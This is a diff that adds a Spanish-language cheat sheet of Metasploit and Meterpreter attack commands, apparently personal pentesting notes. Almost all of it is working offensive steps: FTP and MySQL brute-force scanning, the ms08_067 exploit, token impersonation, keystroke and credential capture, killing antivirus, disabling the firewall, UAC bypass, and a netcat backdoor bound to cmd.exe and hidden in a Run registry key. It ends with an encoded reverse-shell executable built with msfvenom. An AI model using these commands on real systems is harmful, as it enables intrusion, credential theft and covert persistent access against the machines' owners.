@@ -1,0 +1,43 @@
+use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
+	definir RHOSTS (targets)
+use auxiliary/scanner/mysql/mysql_login (Fuerza bruta login MYSQL)
+	definir RHOSTS, PASS_FILE (diccionario), USER_FILE (usuarios)
+
+Para WinXP => use windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
+
+
+Dentro de meterpreter => use incognito
+Después list_tokens -u
+impersonate_token NOMBRE_TOKEN (Añadiendo doble barra cuando haya una barra \ -> \\
+
+Si estamos utilizando meterpreter en un servicio que el usuario puede cerrar, cambiar a otro proceso con migrate PID
+
+
+Para capturar lo que escriba el usuario mejor estar en explorer.exe, y si queremos capturar las credenciales sin crackearlas, winlogon.exe. Cerrar con Ctrl+C
+
+
+run killav Para parar antivirus
+
+
+run persistence -X -i ITERACIONES_ENCODER -p PUERTO -r NUESTRA IP => Para tener persistencia en el sistema
+
+sysinfo
+screenshot
+
+run post/windows/manage/migrate => Migrar de proceso para seguir en el sistema
+
+getsystem
+
+run post/windows/escalate/bypassuac Y luego getsystem
+
+Backdoor:
+    Desactivar firewall
+    kill av => Puede que no esté el nombre, así que habría que hacerlo a mano con el PID
+    upload pentest/windows-binaries/tools/nc.exe C:\\Windows\\
+    reg setval -k HKLM \\software\\microsoft\\windows\\currentversion\\run -c 'C:\RUTA_DE_NC -Ldp 4444 -c cmd.exe' -v netcat (o un nombre más discreto)
+    Conectarse con nc -v IP PUERTO
+
+    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 (o las que queramos) LHOST = IP_LOCAL LPORT = PUERTO_LOCAL -f exe > backdoor.exe
+    Lo subimos con upload
+    Y hacemos los mismo que con nc para hacerlo persistente
+    
